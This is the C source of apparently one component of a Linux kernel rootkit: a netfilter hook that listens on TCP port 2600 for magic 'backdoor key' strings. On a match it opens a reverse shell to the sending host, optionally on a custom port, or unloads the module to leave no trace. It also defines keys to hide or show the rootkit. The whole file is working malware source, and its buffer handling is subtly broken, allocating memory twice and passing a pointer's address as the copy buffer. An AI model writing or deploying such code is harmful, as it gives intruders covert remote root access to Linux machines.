#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/module.h>
#include <linux/tcp.h>
#include <linux/kthread.h>


#include "../../include/h_netfilter.h"
#include "../../include/revshell.h"
#include "../../include/selfdestruct.h"
#include "../../include/h_kill.h"
#include "../../include/hooking.h"

const char* BACKDOOR_KEY_2600 = "2600_PAYLOAD_GET_REVERSE_SHELL";
const char* BACKDOOR_KEY_2600_CUSTOM = "CUSTOM_2600_PAYLOAD_GET_REVERSE_SHELL_";
const char* HIDE_ROOTKIT_KEY_2600 = "2600_HIDE_ROOTKIT";
const char* SHOW_ROOTKIT_KEY_2600 = "2600_SHOW_ROOTKIT";
const char* DESTRUCT = "2600_KILL_ALL";


unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state){
    

    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    struct sk_buff *sock_buff = skb;
    char *user_data;
    
 
    int size;                       
    char* _data;
    struct tcphdr _tcphdr;
    struct iphdr _iph;
    char ip_source[16];

    if (!sock_buff){
        return NF_ACCEPT;
    }
    
    ip_header = skb_header_pointer(skb, 0, sizeof(_iph), &_iph);

    if (!ip_header){
        return NF_ACCEPT;
    }


    if(ip_header->protocol==IPPROTO_TCP){ 
        unsigned int dport;
        unsigned int sport;

        tcp_header = skb_header_pointer(skb, ip_header->ihl * 4, sizeof(_tcphdr), &_tcphdr);

        sport = htons((unsigned short int) tcp_header->source);
        dport = htons((unsigned short int) tcp_header->dest);
        if(dport != 2600){
            return NF_ACCEPT;
        }
        m_printd(KERN_INFO ":: Received packet on port 2600\n");
             

        size = htons(ip_header->tot_len) - sizeof(_iph) - tcp_header->doff*4;
        _data = kmalloc(size, GFP_KERNEL);

			if (!_data)
				return NF_ACCEPT;
        _data = kmalloc(size, GFP_KERNEL);
        user_data = skb_header_pointer(skb, ip_header->ihl*4 + tcp_header->doff*4, size, &_data);
        if(!user_data){
            m_printd(KERN_INFO "NULL INFO");
            kfree(_data);
            return NF_ACCEPT;
        }
        m_printd(KERN_DEBUG "data len : %d\ndata : \n", (int)strlen(user_data));
        m_printd(KERN_DEBUG "%s\n", user_data);

        if(strlen(user_data)<10){
            return NF_ACCEPT;
        }
        
        if(memcmp(user_data, BACKDOOR_KEY_2600, strlen(BACKDOOR_KEY_2600))==0){
            /****BACKDOOR KEY - Open a shell***/


            m_printd(KERN_INFO ":: Received backdoor packet \n");

            
            snprintf(ip_source, 16, "%pI4", &ip_header->saddr);

            m_printd(KERN_INFO ":: Shell connecting to %s:%s \n", ip_source, REVERSE_SHELL_PORT);

            start_reverse_shell(ip_source, REVERSE_SHELL_PORT);
            return NF_DROP;
        }else if (strlen(user_data) == strlen(BACKDOOR_KEY_2600_CUSTOM)+ 4){
            /****BACKDOOR KEY - Open a shell with custom port***/
            snprintf(ip_source, 16, "%pI4", &ip_header->saddr);
            char last_four[5];
            strncpy(last_four, user_data + strlen(user_data) - 4, 4);
            last_four[4] = '\0';
            m_printd(KERN_INFO ":: Shell custom port connecting to %s:%s \n", ip_source, last_four);
            start_reverse_shell(ip_source, last_four);
            return NF_DROP;
        }else if(memcmp(user_data, DESTRUCT, strlen(DESTRUCT))==0){
            /****SELFTDESTRUCT - No trace left***/
            snprintf(ip_source, 16, "%pI4", &ip_header->saddr);

            module_show();
            schedule_work(&my_work_unload);

            return NF_DROP;
        }
        return NF_ACCEPT;
    }
    return NF_ACCEPT;

}

static struct nf_hook_ops nfho;

int register_netfilter_hook(void){
    int err;
    
    nfho.hook = net_hook;
    nfho.pf = PF_INET;
    nfho.hooknum = NF_INET_PRE_ROUTING;
    nfho.priority = NF_IP_PRI_FIRST;

    err = nf_register_net_hook(&init_net, &nfho);
    if(err<0){
        m_printd(KERN_INFO ":: Error registering nf hook");
    }else{
        m_printd(KERN_INFO ":: Registered nethook");
    }
    
    return err;
}

void unregister_netfilter_hook(void){

    nf_unregister_net_hook(&init_net, &nfho);
    m_printd(KERN_INFO ":: Unregistered nethook");

}
